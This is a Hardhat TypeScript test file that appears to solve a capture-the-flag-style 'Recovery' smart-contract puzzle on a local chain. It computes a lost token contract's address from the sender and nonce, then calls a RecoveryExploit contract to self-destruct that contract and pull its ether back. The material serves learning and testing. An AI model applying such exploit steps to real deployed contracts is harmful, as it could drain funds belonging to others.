import { SignerWithAddress } from "@nomiclabs/hardhat-ethers/signers"
import { expect } from "chai"
import { ethers, network, deployments } from "hardhat"
import { developmentChains } from "../../helper-hardhat-config"
import { Recovery, RecoveryExploit } from "../../typechain-types"

!developmentChains.includes(network.name)
    ? describe.skip
    : describe("Recovery Exploit Testing", () => {
          let recovery: Recovery
          let recoveryExploit: RecoveryExploit
          let deployer: SignerWithAddress
          before(async () => {
              await deployments.fixture(["recovery"])

              recovery = await ethers.getContract("Recovery")
              recoveryExploit = await ethers.getContract("RecoveryExploit")

              expect(await ethers.provider.getBalance(recovery.address)).equals(
                  ethers.utils.parseEther("0.01"),
                  "initial balance = 0.01 ether"
              )

              const accounts = await ethers.getSigners()
              deployer = accounts[0]
          })

          it("Recovery exploit testing", async () => {
              //-n first lets generate simple token on Recovery contract
              await (
                  await recovery.generateToken("stt", ethers.provider.getBalance(recovery.address))
              ).wait()

              //-n transfer all eth in account to simple token
              await (await recovery.mintTokensforEth()).wait()

              expect(await ethers.provider.getBalance(recovery.address)).equals(
                  0,
                  "balance = 0 as all balance is transfered to simpletoken"
              )
              //-n next get the simple token contract address by running the getDeployedContractAddress
              //-n note that this function uses the determinstic formula used to calculate the contract address given sender and nonce
              const tokenAddress = await recovery.token()
              const calculatedAddress = await recoveryExploit.getDeployedContractAddress(
                  recovery.address,
                  1
              )

              expect(calculatedAddress).equals(tokenAddress, "token address == calculated address")

              //-n destroy simple token and send all balance back to recovery
              await (await recoveryExploit.destroySimpleToken(recovery.address, 1)).wait()

              expect(await ethers.provider.getBalance(recovery.address)).equals(
                  ethers.utils.parseEther("0.01"),
                  "recovery balance = 0.01 ether"
              )
          })
      })
